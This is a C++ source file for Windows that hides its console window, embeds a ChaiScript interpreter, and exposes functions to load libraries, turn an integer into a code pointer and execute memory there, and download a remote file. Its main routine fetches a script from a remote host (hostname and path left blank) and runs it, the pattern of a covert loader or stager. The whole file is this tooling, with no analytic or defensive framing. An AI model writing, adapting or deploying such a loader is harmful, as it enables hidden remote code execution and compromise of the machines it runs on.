#include <stdint.h>
#include <string>
#include <vector>

#include <chaiscript/chaiscript.hpp>
#include "dyncall.h"
#include "callGate.h"

#include "HTTP.h"
#include "chaiHelpers.h"
#include <Windows.h>

void HideConsole()
{
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
}

void* execAddress = {};

chaiscript::ChaiScript chai;

int convertAddrAndAssign(uint64_t memoryIntAddr) {
	std::stringstream stream;
	stream << std::hex << memoryIntAddr;
	std::string memoryStrAddr(stream.str());

	unsigned long long memoryAddr = {};
	sscanf(memoryStrAddr.c_str(), "%llx", &memoryAddr);
	execAddress = (void*)(uintptr_t)memoryAddr;

	return 0;
}

int executeMemory() {
	((void(*)())execAddress)();
	return 0;
}

int main(int argc, char** argv)
{
	HideConsole();
	chai.add(chaiscript::user_type<DLLib*>(), "libPtr");

	chai.add(chaiscript::fun(&chai_LoadLib), "LoadLibrary");
	chai.add(chaiscript::fun(&chai_dbgAddr), "DbgAddr");
	chai.add(chaiscript::fun(&chai_uintPtr), "uintPtr");
	chai.add(chaiscript::fun(&chai_pushArray), "pushArray");
	chai.add(chaiscript::fun(&chai_printUint32Hex), "printUint32Hex");
	chai.add(chaiscript::fun(&chai_printUint64Hex), "printUint64Hex");


	chai.add(chaiscript::fun(&convertAddrAndAssign), "convertAddrAndAssign");
	chai.add(chaiscript::fun(&executeMemory), "executeMemory");
	chai.add(chaiscript::fun(&getRemoteFile), "getRemoteFile");

	chai.add(registerFunCall());

	std::string scriptHostname = "";
	std::string scriptPath = "";

	std::string scriptResult = getRemoteFile(scriptHostname, scriptPath);


	chai.eval(scriptResult);


	return 0;
}
